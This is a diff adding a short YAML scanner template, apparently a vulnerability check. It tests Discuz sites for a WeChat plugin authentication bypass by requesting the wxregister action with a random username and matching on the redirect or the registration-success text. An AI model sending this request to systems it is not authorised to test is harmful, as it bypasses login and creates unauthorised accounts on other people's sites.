@@ -1,0 +1,19 @@
+id: poc-yaml-discuz-wechat-random-login
+info:
+  name: Discuz Wechat Random Login
+  severity: high
+  tags:
+  - 认证绕过
+  finger: Discuz
+  osprey-id: vb_2018_0049
+variables:
+  r_name: random_str(6)
+requests:
+- method: GET
+  path: /plugin.php?id=wechat:wechat&ac=wxregister&username={{.r_name}}
+  expression: "(\n  status_code == 302 &&\n  contains(headers, \"location\") &&\n\
+    \  contains(headers, \".com/?c=site&a=wxuserregister\")\n) ||\n(\n  status_code\
+    \ == 302 &&\n  contains(headers, \".com/?c=site&a=wxuserregister\")\n) ||\n(\n\
+    \  status_code == 200 &&\n  (\n    contains(body, \"帐号已成功注册\") ||\n    contains(body,\
+    \ \"<span class=\\\"username\\\">\")\n  ) &&\n  contains(body, r_name)\n)\n"
+transport: http
